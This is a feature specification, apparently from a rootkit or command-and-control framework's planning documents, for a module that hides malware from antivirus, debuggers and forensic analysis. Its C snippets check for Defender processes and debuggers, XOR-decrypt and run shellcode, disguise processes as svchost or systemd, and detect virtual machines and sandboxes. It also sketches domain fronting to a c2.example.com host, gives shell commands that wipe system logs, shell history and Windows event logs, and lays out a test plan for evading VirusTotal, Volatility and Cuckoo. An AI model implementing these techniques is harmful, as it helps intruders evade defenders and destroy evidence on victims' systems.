# F0206: Rootkit Evasion

## Metadata
| Field | Value |
|---|---|
| ID | F0206 |
| Priority | v2 |
| Status | Planned |
| MVP Phase | v2 |
| Depends on | F0015, F0200, F0205 |

## Summary
Evasion framework for rootkit suite providing stealth capabilities against AV/EDR detection, network monitoring, and forensic analysis. Includes sleep-mode during scans, code obfuscation, anti-debugging techniques, process masquerading, and behavioral adaptation to minimize detection risk.

## Requirements
- AV/EDR detection and response
- Anti-debugging techniques
- Code obfuscation and encryption
- Process masquerading
- Behavioral adaptation
- Network traffic evasion
- Forensic artifact minimization

## AV/EDR Evasion

### Scan Detection

**Techniques:**
- Monitor for AV process names (avg.exe, msnucleus.exe, etc.)
- Detect hook injection into current process
- Monitor for handle enumeration
- Detect memory scanning patterns

**Implementation:**
`c
bool is_av_scanning() {
    // Check for known AV processes
    if (process_exists("avg.exe") || process_exists("MsMpEng.exe")) {
        return true;
    }

    // Check for hooks in PEB
    if (peb_hooks_detected()) {
        return true;
    }

    // Monitor handle count spikes
    if (handle_count_sudden_increase()) {
        return true;
    }

    return false;
}
`

**Response Actions:**
- Enter sleep mode (stop heartbeat)
- Hide additional artifacts
- Unhook temporarily
- Encrypt memory regions

### Code Signature Evasion

**Techniques:**
- Position Independent Code (PIC)
- Runtime code decryption
- Polymorphic code generation
- Import Address Table (IAT) obfuscation

**Implementation:**
`c
// Encrypted shellcode decrypted at runtime
uint8_t encrypted_payload[] = {...};
void decrypt_and_execute() {
    xor_decrypt(encrypted_payload, key, length);
    ((void(*)())encrypted_payload)();
}
`

## Anti-Debugging Techniques

### Timing Checks
`c
bool is_debugged_timing() {
    DWORD start = GetTickCount64();
    for (volatile int i = 0; i < 1000000; i++);
    DWORD end = GetTickCount64();
    return (end - start) > 100; // Debugger slows execution
}
`

### NtGlobalFlag Check
`c
bool is_debugged_globalflag() {
    PPEB peb = NtCurrentPeb();
    return (peb->NtGlobalFlag & 0x10) != 0;
}
`

### BeingDebugged Flag
`c
bool is_debugged_peb() {
    PPEB peb = NtCurrentPeb();
    return peb->BeingDebugged;
}
`

### TRAP Flag
`c
bool is_debugged_trap() {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_CONTROL;
    GetThreadContext(GetCurrentThread(), &ctx);
    return (ctx.EFlags & 0x100) != 0;
}
`

### CreateToolhelp32Snapshot
`c
// Set SEH handler to catch debugger calls
__try {
    CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
}
__except (EXCEPTION_EXECUTE_HANDLER) {
    return true; // Debugger detected
}
`

## Process Masquerading

### Linux
`c
// Change process name
setproctitle("systemd-udevd");

// Replace /proc/[pid]/comm
sprintf(comm_buf, "kworker/%d", getpid());

// Masquerade as kernel thread
current->comm[0] = 'k';
`

### Windows
`c
// Set process title
SetConsoleTitle("Service Host");

// Impersonate service
// Run as svchost.exe with valid service params
`

## Memory Evasion

### String Hiding
`c
// Avoid hardcoded strings
const char *get_url() {
    static uint8_t encoded[] = {0x75, 0x75, 0x73, 0x63...};
    static char decoded[64];
    xor_decode(encoded, decoded, sizeof(encoded), 0xAA);
    return decoded;
}
`

### Import Obfuscation
`c
// Resolve APIs at runtime without IAT
HMODULE kernel32 = GetModuleHandle("kernel32.dll");
GetProcAddress(kernel32, "VirtualAlloc");
`

### Memory Encryption
`c
// Encrypt payload in memory, decrypt only when executing
mprotect(page, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);
decrypt_region(page, size);
execute_region(page);
encrypt_region(page, size);
`

## Network Evasion

### Port Rotation
`json
{
  "ports": [443, 8443, 80, 8080],
  "rotation_interval": 3600,
  "primary_port": 443
}
`

### Domain Fronting
`
Host: google.com
SNI: cdn.google.com
Actual destination: c2.example.com
`

### Traffic Timing
- Random intervals between requests
- Mimic human browsing patterns
- Burst traffic during high network activity

## Forensic Evasion

### Linux
`ash
# Clear logs
> /var/log/auth.log
> /var/log/syslog

# Remove shell history
history -c
> ~/.bash_history

# Hide files via rootkit
# Remove from /proc mount listings
`

### Windows
`powershell
# Clear Event Logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Remove from Recent Docs
# Clear Prefetch (advanced)
# Hide registry keys via rootkit
`

## Behavioral Adaptation

### Learning Mode
`
1. Monitor network traffic patterns
2. Learn typical traffic times
3. Schedule heartbeat during high traffic
4. Adapt to network changes
`

### Environment Awareness
`c
bool is_vm() {
    // Check for VM artifacts
    if (cpu_id_contains("VMware") || cpu_id_contains("VBOX")) {
        return true;
    }
    if (pci_device_is_vm()) {
        return true;
    }
    return false;
}

bool is_sandbox() {
    // Check for sandbox indicators
    if (low_ram() && low_cpu() && short_uptime()) {
        return true;
    }
    if (known_sandbox_processes()) {
        return true;
    }
    return false;
}
`

## Evasion Configuration

`json
{
  "av_evasion": {
    "enabled": true,
    "sleep_on_detection": true,
    "monitored_processes": ["avg.exe", "MsMpEng.exe", "sandbox.exe"]
  },
  "anti_debug": {
    "enabled": true,
    "techniques": ["timing", "peb", "trap", "seh"],
    "action_on_detect": "exit"
  },
  "obfuscation": {
    "string_encoding": "xor",
    "import_obfuscation": true,
    "memory_encryption": true
  },
  "masquerading": {
    "process_name": "svchost",
    "icon_path": "C:\\Windows\\System32\\svchost.exe"
  },
  "behavioral": {
    "vm_detection": true,
    "sandbox_detection": true,
    "learning_mode": false
  }
}
`

## Sleep Mode Integration

See [F0205](0205-rootkit-communication.md) for communication sleep mode.

**Evasion-specific sleep triggers:**
- AV scan detected
- Debugger attached
- Suspicious process spawned
- Network anomaly detected

## Stages

### Stage 1: AV/EDR Detection
**Goal:** Implement AV/EDR detection mechanisms.
**Acceptance Criteria:**
- [ ] Detect known AV processes
- [ ] Detect PEB hooks
- [ ] Sleep mode on detection
- [ ] Resume after scan completes

### Stage 2: Anti-Debugging
**Goal:** Implement anti-debugging techniques.
**Acceptance Criteria:**
- [ ] Timing check detection
- [ ] PEB BeingDebugged check
- [ ] TRAP flag detection
- [ ] SEH-based detection

### Stage 3: Obfuscation
**Goal:** Implement code and string obfuscation.
**Acceptance Criteria:**
- [ ] String XOR encoding
- [ ] Runtime API resolution
- [ ] Memory encryption
- [ ] No hardcoded sensitive data

### Stage 4: Process Masquerading
**Goal:** Implement process masquerading.
**Acceptance Criteria:**
- [ ] Linux: setproctitle and /proc hiding
- [ ] Windows: process title and icon
- [ ] Masquerade as system process

### Stage 5: Behavioral Adaptation
**Goal:** Implement VM/sandbox detection.
**Acceptance Criteria:**
- [ ] VM artifact detection
- [ ] Sandbox heuristic detection
- [ ] Delayed execution in VMs
- [ ] Learning mode (optional)

## Feature Acceptance Criteria

- [ ] AV detection triggers sleep mode
- [ ] Debugger detection prevents analysis
- [ ] Strings not visible in memory dump
- [ ] Process appears as legitimate system process
- [ ] VM/sandbox detection delays execution

## Test Plan

### Unit Tests
- [ ] test_av_process_detection
- [ ] test_debugger_detection_techniques
- [ ] test_string_encoding_decoding
- [ ] test_vm_detection_signatures

### System / Integration Tests
- [ ] Run under VirusTotal; verify sleep mode
- [ ] Debug with x64dbg; verify detection
- [ ] Memory dump with Volatility; verify obfuscation
- [ ] Run in VM; verify detection and delay
- [ ] Run in Cuckoo Sandbox; verify evasion

### Playwright Tests
- [ ] Rootkit builder shows evasion options
- [ ] Configure evasion techniques
- [ ] Generate payload with evasion enabled
- [ ] View evasion status on beacon

## Related Features

- **Overview:** [F0200](0200-rootkit-suite-overview.md)
- **Communication:** [F0205](0205-rootkit-communication.md)
- **Windows Rootkit:** [F0203](0203-windows-rootkit.md)
- **Memory-Only Execution:** [F0108](0108-memory-only-beacon-execution.md)
